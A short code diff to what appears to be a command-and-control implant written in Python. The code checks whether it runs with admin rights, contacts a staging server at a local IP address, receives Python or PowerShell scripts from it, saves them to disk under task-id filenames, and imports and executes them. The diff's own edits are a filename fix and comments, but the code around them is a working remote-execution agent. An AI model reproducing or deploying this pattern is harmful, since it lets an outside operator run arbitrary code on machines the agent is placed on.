@@ -18,7 +18,8 @@ import ctypes
 def staging(identifier):
 	url = 'http://192.168.1.2:8080/stage_0'
 	platform_name = platform.system()
-	
+
+	## Check if ran as admin or not
 	if platform_name == 'Windows':
 		admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
 	elif platform_name == 'Linux':
@@ -62,12 +63,14 @@ def handle_commands(response, identifier):
 		else:
 			dump_dir = os.getcwd()
 
-		## Script save to file as per language
+		## Script save to file as per language, and filename is saved with taskid
+		## so that it doesn't conflict with same filename stored in memory
+		filename = res['command']+f"_{res['task_id']}"
 		if language == 'python':
-			save_path = join(dump_dir,res['command']+".py")
+			save_path = join(dump_dir,f"{filename}.py")
 		else:
 			## Powershell
-			save_path = join(dump_dir,res['command']+".ps1")
+			save_path = join(dump_dir,f"{filename}.ps1")
 
 		f = open(save_path, "w+")
 		f.write(res['script'])
@@ -79,7 +82,7 @@ def handle_commands(response, identifier):
 			if language == 'python':
 				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
 				sys.path.append(os.path.abspath(dump_dir))
-				file =  __import__(res['command'])
+				file =  __import__(filename)
 
 				command_output = file.execute_command()
 			else:
